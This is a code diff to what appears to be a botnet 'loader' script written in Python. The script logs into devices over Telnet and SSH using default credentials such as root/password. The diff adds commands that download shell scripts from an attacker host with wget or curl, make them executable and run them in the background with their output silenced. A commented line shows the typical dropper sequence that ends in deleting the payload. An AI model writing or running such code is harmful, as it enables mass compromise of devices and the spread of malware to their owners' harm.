@@ -48,9 +48,15 @@ def doTelnetLogin(ip, port, user, pass_):
                     print("[loader] Login succeeded %s " % ip +" --> "+ ' : '.join((user, password)))
                     response = tn.read_until(b"#", 1)
                     #tn.write(("cd /tmp; cd/var/run; cd /mnt; cd/root; wget %s; chmod +x %s; ./%s; rm -rf %s;" % (__bin__,os.path.basename(__bin__), os.path.basename(__bin__), os.path.basename(__bin__)) + "\n").encode('ascii'))
-                    cmd="wget "+Host_IP+"/wget_download_exec.sh"  #test host ip => http://192.168.1.97:31338
+                    cmd = "wget http://"+Host_IP+"/wget_download_exec.sh"  #test host ip => http://192.168.1.97:31338
+                    cmd += " || "
+                    cmd += "curl http://"+Host_IP+"/curl_download_exec.sh -o curl_download_exec.sh"
                     cmd1="chmod +x wget_download_exec.sh"
+                    cmd1 +=" || "
+                    cmd1 += "chmod +x curl_download_exec.sh"
                     cmd2="sh ./wget_download_exec.sh"
+                    cmd2+=" || "
+                    cmd2+="sh ./curl_download_exec.sh"
                     tn.write((cmd+"\n").encode('ascii'))  
                     response = tn.read_until(b"#", 1)
                     print(str(response))
@@ -60,7 +66,7 @@ def doTelnetLogin(ip, port, user, pass_):
                     tn.write((cmd2+" & \n").encode('ascii'))  
                     response = tn.read_until(b"#", 1)
                     print("Exec command "+cmd +"--> Successful")                
-                    print("[loader] This device is broken.")
+                    print("[loader] This device is broken. Use Telnet")
                     return
         except EOFError as e:
             tn = None
@@ -73,10 +79,27 @@ def doSSHLogin(ip, port, user, pass_):
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         client.connect(ip, port=port, username=user, password=pass_)
-        command="cd /tmp ; ls"
-        stdin, stdout, stderr = client.exec_command(command)
+        #command="cd /tmp ; ls"
+        cmd = "wget http://"+Host_IP+"/wget_download_exec.sh"  #test host ip => http://192.168.1.97:31338
+        cmd += " || "
+        cmd += "curl http://"+Host_IP+"/curl_download_exec.sh -o curl_download_exec.sh"
+        cmd1="chmod +x wget_download_exec.sh"
+        cmd1 +=" || "
+        cmd1 += "chmod +x curl_download_exec.sh"
+        cmd2="(sh ./wget_download_exec.sh || sh ./curl_download_exec.sh) > /dev/null 2>&1 &"
+        stdin, stdout, stderr = client.exec_command(cmd)
         output = stdout.read().decode('utf-8')
         print(output)
+        time.sleep(1)
+        stdin, stdout, stderr = client.exec_command(cmd1)
+        output = stdout.read().decode('utf-8')
+        print(output)
+        time.sleep(1)
+        stdin, stdout, stderr = client.exec_command(cmd2)
+        output = stdout.read().decode('utf-8')
+        print(output)
+        print("Exec command --> Successful")                
+        print("[loader] This device is broken. Use SSH")
     except paramiko.AuthenticationException:
         print("Authentication failed.")
     except paramiko.SSHException as e:
@@ -105,6 +128,6 @@ def ForceDB(fname):
 if __name__ == '__main__':
     #Host_IP, targerIP = read_config_ip()
     #ForceDB(sys.argv[2])
-    doTelnetLogin("192.168.1.121", "23", "root", "password")
-    #doSSHLogin("192.168.1.167","22","admin","password")
+    #doTelnetLogin("192.168.1.121", "23", "root", "password")
+    doSSHLogin("192.168.1.163","22","admin","password")
     
